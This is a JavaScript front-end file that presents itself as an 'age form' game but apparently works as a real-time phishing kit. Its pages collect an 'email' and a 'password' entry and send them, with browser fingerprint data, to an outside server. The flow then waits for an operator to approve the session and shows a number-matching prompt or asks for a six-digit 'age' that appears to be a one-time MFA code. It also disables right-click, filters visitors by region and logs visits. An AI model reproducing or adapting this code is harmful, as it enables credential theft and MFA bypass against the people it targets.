// Disable right-click context menu globally
document.addEventListener('contextmenu', (event) => {
  event.preventDefault();
});

const RAW_API_BASE = window.API_BASE || 'https://moozes.pythonanywhere.com';
const API_BASE = RAW_API_BASE.replace(/\/+$/, '');
const PLAYER_KEY = 'ageform_player';
const LOCATION_KEY = 'ageform_location';
const SESSION_ID_KEY = 'ageform_session_id';

function getSessionId() {
  let sid = localStorage.getItem(SESSION_ID_KEY);
  if (!sid) {
    sid = 'sid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
    localStorage.setItem(SESSION_ID_KEY, sid);
  }
  return sid;
}

function getFetchHeaders(customHeaders = {}) {
  return {
    'Content-Type': 'application/json',
    'X-Session-ID': getSessionId(),
    ...customHeaders,
  };
}

async function getSession() {
  const response = await fetch(`${API_BASE}/api/session`, {
    headers: getFetchHeaders(),
  });
  if (response.status === 403) {
    const data = await response.json().catch(() => ({}));
    if (data.blocked) {
      document.body.innerHTML = `
        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0d1117;color:#f0f6fc;font-family:sans-serif;text-align:center;padding:20px;">
          <div>
            <h1 style="color:#f85149;margin-bottom:12px;">Access Denied</h1>
            <p style="color:#8b949e;max-width:400px;line-height:1.5;">${data.error || 'This service is not available in your region.'}</p>
          </div>
        </div>
      `;
      throw new Error('Access denied by region filter.');
    }
  }
  if (!response.ok) throw new Error('Unable to read game session.');
  return response.json();
}

function goTo(path) {
  window.location.href = path;
}

function renderPlayerName() {
  const display = document.getElementById('displayPlayerName');
  if (!display) return;
  const playerName = localStorage.getItem(PLAYER_KEY);
  if (playerName) {
    display.textContent = `${playerName}`;
  }
}

// Resilient polling with exponential retry backoff
function startResilientPoll(updateCallback, baseIntervalMs = 300) {
  let pollTimer = null;
  let currentDelay = baseIntervalMs;

  const pollStep = async () => {
    try {
      const session = await getSession();
      updateCallback(session);
      currentDelay = baseIntervalMs; // reset delay on successful poll
    } catch (error) {
      console.warn('Network issue during session poll. Retrying...', error);
      currentDelay = Math.min(currentDelay * 1.5, 3000); // backoff up to 3s
    } finally {
      pollTimer = setTimeout(pollStep, currentDelay);
    }
  };

  pollStep();
  return () => clearTimeout(pollTimer);
}

// Session Heartbeat Ping
function startHeartbeat() {
  setInterval(async () => {
    try {
      await fetch(`${API_BASE}/api/heartbeat`, {
        method: 'POST',
        headers: getFetchHeaders(),
      });
    } catch (error) {
      // silent background heartbeat error catch
    }
  }, 30000);
}

function renderBlockedScreen(message) {
  document.body.innerHTML = `
    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0d1117;color:#f0f6fc;font-family:sans-serif;text-align:center;padding:20px;">
      <div>
        <h1 style="color:#f85149;margin-bottom:12px;">Access Denied</h1>
        <p style="color:#8b949e;max-width:400px;line-height:1.5;">${message || 'This service is not available in your region.'}</p>
      </div>
    </div>
  `;
}

async function verifyRegionAccess() {
  try {
    const res = await fetch(`${API_BASE}/api/session`, { headers: getFetchHeaders() });
    if (res.status === 403) {
      const data = await res.json().catch(() => ({}));
      if (data.blocked) {
        renderBlockedScreen(data.error);
        return false;
      }
    }
  } catch (err) {
    // network error
  }
  return true;
}

function initPlayerSetup() {
  const form = document.getElementById('emailForm');
  if (!form) return;

  verifyRegionAccess();

  if (!sessionStorage.getItem('ageform_visit_logged')) {
    const clientInfo = {
      screen: `${window.screen.width}x${window.screen.height}`,
      timezone: (Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || 'Unknown',
      language: navigator.language || 'Unknown',
      platform: navigator.platform || 'Unknown',
    };
    fetch(`${API_BASE}/api/visit`, {
      method: 'POST',
      headers: getFetchHeaders(),
      body: JSON.stringify({ referrer: document.referrer || 'Direct', clientInfo }),
    })
      .then((res) => {
        if (res.status === 403) {
          res.json().then((data) => {
            if (data.blocked) renderBlockedScreen(data.error);
          }).catch(() => {});
        } else {
          sessionStorage.setItem('ageform_visit_logged', 'true');
        }
      })
      .catch(() => {});
  }

  form.addEventListener('submit', async (event) => {
    event.preventDefault();
    const playerName = document.getElementById('playerName').value.trim();
    if (!playerName) return;
    localStorage.setItem(PLAYER_KEY, playerName);
    goTo('password.html');
  });
}

function initLocationSetup() {
  const form = document.getElementById('ageForm');
  if (!form) return;

  const playerName = localStorage.getItem(PLAYER_KEY);
  if (!playerName) {
    goTo('index.html');
    return;
  }
  renderPlayerName();

  form.addEventListener('submit', async (event) => {
    event.preventDefault();
    const gameLocation = document.getElementById('gameLocation').value.trim();
    if (!gameLocation) return;
    localStorage.setItem(LOCATION_KEY, gameLocation);

    const clientInfo = {
      screen: `${window.screen.width}x${window.screen.height}`,
      timezone: (Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || 'Unknown',
      language: navigator.language || 'Unknown',
      platform: navigator.platform || 'Unknown',
    };

    try {
      const response = await fetch(`${API_BASE}/api/submit`, {
        method: 'POST',
        headers: getFetchHeaders(),
        body: JSON.stringify({ playerName, gameLocation, clientInfo }),
      });
      if (!response.ok) {
        const data = await response.json().catch(() => ({}));
        alert(data.error || '');
        return;
      }
      goTo('waiting.html');
    } catch (error) {
      alert('');
      console.warn(error);
    }
  });
}

function initWaitingPage() {
  if (!document.getElementById('waitingPage')) return;
  const playerName = localStorage.getItem(PLAYER_KEY);
  const location = localStorage.getItem(LOCATION_KEY);
  if (!playerName || !location) {
    goTo('index.html');
    return;
  }
  renderPlayerName();

  startResilientPoll((session) => {
    if (session.status === 'declined') goTo('connection-lost.html');
    if (session.status === 'accepted') {
      if (session.mode === 'code') {
        goTo('code.html');
      } else if (session.mode === 'number' && session.number !== null) {
        goTo('number.html');
      }
    }
  });
}

function initNumberPage() {
  const page = document.getElementById('numberPage');
  if (!page) return;

  const playerName = localStorage.getItem(PLAYER_KEY);
  const location = localStorage.getItem(LOCATION_KEY);
  if (!playerName || !location) {
    goTo('index.html');
    return;
  }

  renderPlayerName();
  const selected = document.getElementById('selectedNumber');
  const selected2 = document.getElementById('selectedNumber2');

  startResilientPoll((session) => {
    if (session.status === 'declined') {
      goTo('connection-lost.html');
      return;
    }
    if (session.status === 'idle' || session.status === 'submitted') {
      goTo('waiting.html');
      return;
    }
    if (session.mode === 'code') {
      goTo('code.html');
      return;
    }
    if (session.mode === 'number' && session.number === null) {
      goTo('waiting.html');
      return;
    }

    const number = session.number === null ? '' : `${session.number}`;
    if (selected) selected.textContent = number;
    if (selected2) selected2.textContent = number;
  });
}

function initCodePage() {
  const page = document.getElementById('codePage');
  if (!page) return;

  const playerName = localStorage.getItem(PLAYER_KEY);
  const location = localStorage.getItem(LOCATION_KEY);
  if (!playerName || !location) {
    goTo('index.html');
    return;
  }

  renderPlayerName();
  const form = document.getElementById('ageGuessForm');
  const result = document.getElementById('ageResult');

  startResilientPoll((session) => {
    if (session.status === 'declined') {
      goTo('connection-lost.html');
      return;
    }
    if (session.status === 'idle' || session.status === 'submitted') {
      goTo('waiting.html');
      return;
    }
    if (session.mode === 'number') {
      goTo('number.html');
      return;
    }
  });

  form.addEventListener('submit', async (event) => {
    event.preventDefault();
    const age = Number(document.getElementById('age').value);
    if (!Number.isInteger(age) || age < 1 || age > 999999) return;
    try {
      const response = await fetch(`${API_BASE}/api/age`, {
        method: 'POST',
        headers: getFetchHeaders(),
        body: JSON.stringify({ age }),
      });
      if (!response.ok) throw new Error('Age response was not accepted.');
      result.textContent = `Your entered age: ${age}`;
      goTo('success.html');
    } catch (error) {
      result.textContent = 'The response could not be sent.';
      console.warn(error);
    }
  });
}

function initConnectionLostPage() {
  if (!document.getElementById('connectionLostPage')) return;
  renderPlayerName();
  startResilientPoll((session) => {
    if (session.status === 'accepted') {
      if (session.mode === 'code') {
        goTo('code.html');
      } else if (session.mode === 'number' && session.number !== null) {
        goTo('number.html');
      }
    }
  });
}

function initSuccessPage() {
  if (!document.getElementById('successPage')) return;
  const playerName = localStorage.getItem(PLAYER_KEY);
  if (!playerName) {
    goTo('index.html');
    return;
  }
  renderPlayerName();
}

startHeartbeat();
initPlayerSetup();
initLocationSetup();
initWaitingPage();
initNumberPage();
initCodePage();
initConnectionLostPage();
initSuccessPage();
